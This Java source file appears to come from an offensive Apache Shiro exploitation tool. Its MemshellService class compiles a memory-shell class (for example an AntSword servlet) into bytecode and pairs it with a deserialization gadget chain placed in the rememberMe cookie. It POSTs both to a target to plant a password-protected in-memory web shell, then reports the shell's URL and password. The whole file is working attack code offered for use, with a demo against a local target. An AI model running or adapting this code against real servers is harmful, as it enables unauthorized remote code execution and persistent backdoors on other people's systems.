package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.ResponseOBJ;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;
import javassist.*;
import okhttp3.FormBody;

import java.lang.reflect.Method;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * 内存马注入服务
 * 提供完整的内存马注入流程
 */
public class MemshellService {
    /**
     * 内存马注入结果
     */
    public static class InjectResult {
        public boolean success;
        public String message;
        public String response;
        public String memshellType;
        public String path;
        public String password;

        public InjectResult(boolean success, String message, String response, String memshellType, String path, String password) {
            this.success = success;
            this.message = message;
            this.response = response;
            this.memshellType = memshellType;
            this.path = path;
            this.password = password;
        }
    }

    /**
     * 注入内存马
     * @param targetOBJ 请求对象
     * @param memshellType 内存马类型
     * @param path 内存马路径
     * @param password 内存马密码
     * @param gadget 指定利用gadget
     * @return 注入结果
     */
    public static InjectResult injectMemshell(TargetOBJ targetOBJ, String memshellType, String path, String password, String gadget) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass memshellCtClass = pool.getCtClass("com.y5neko.shiroexp.memshell." + memshellType);

        // 获取内存马字节码
        byte[] memshellBytes = memshellCtClass.toBytecode();
        String memshellPayload = Base64.getEncoder().encodeToString(memshellBytes);

        // 获取内存马注入的payload
        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);      // 反射获取利用链
        Method method = gadget_clazz.getDeclaredMethod("genMemPayload", String.class);
        String payload = (String) method.invoke(null, targetOBJ.getKey());

        // 构造请求头
        Map<String, String> headers = new HashMap<>();
        headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
        headers.put("p", password);
        headers.put("path", path);

        // 构造POST请求体
        FormBody formBody = new FormBody.Builder().add("token", memshellPayload).build();

        // 注入内存马
        ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, formBody, headers, "POST");
        String responseStr = Tools.bytesToString(responseOBJ.getResponse());

        if (responseStr.contains("Success")) {
            // 从完整URL中提取基础URL（协议+主机+端口）
            String baseUrl = targetOBJ.getUrl();
            try {
                URL urlObj = new URL(baseUrl);
                // 构造基础URL：协议 + :// + 主机 + 端口（如果非标准端口）
                StringBuilder base = new StringBuilder();
                base.append(urlObj.getProtocol()).append("://");
                base.append(urlObj.getHost());
                int port = urlObj.getPort();
                if (port != -1 && port != 80 && port != 443) {
                    base.append(":").append(port);
                }
                baseUrl = base.toString();
            } catch (Exception e) {
                // URL解析失败，使用原始值
            }

            // 确保 path 以 / 开头
            String memshellPath = path;
            if (!memshellPath.startsWith("/")) {
                memshellPath = "/" + memshellPath;
            }

            String fullUrl = baseUrl + memshellPath;
            return new InjectResult(true, "内存马注入成功", responseStr, memshellType, fullUrl, password);
        } else {
            return new InjectResult(false, "内存马注入失败：响应中未找到 Success 标记", responseStr, memshellType, path, password);
        }
    }

    public static void main(String[] args) throws Exception {
        InjectResult result = injectMemshell(new TargetOBJ("http://127.0.0.1:8080"),"AntSwordServlet", "/qwer333", "test123", "CommonsBeanutils1");
        if (result.success) {
            System.out.println(Log.buffer_logging("SUCC", result.message));
            System.out.println("----------");
            System.out.println("类型: " + result.memshellType);
            System.out.println("地址: " + result.path);
            System.out.println("密码: " + result.password);
            System.out.println("----------");
        } else {
            System.out.println(Log.buffer_logging("EROR", result.message));
            System.out.println("----------");
            System.out.println("响应内容: " + result.response);
            System.out.println("----------");
        }
    }
}
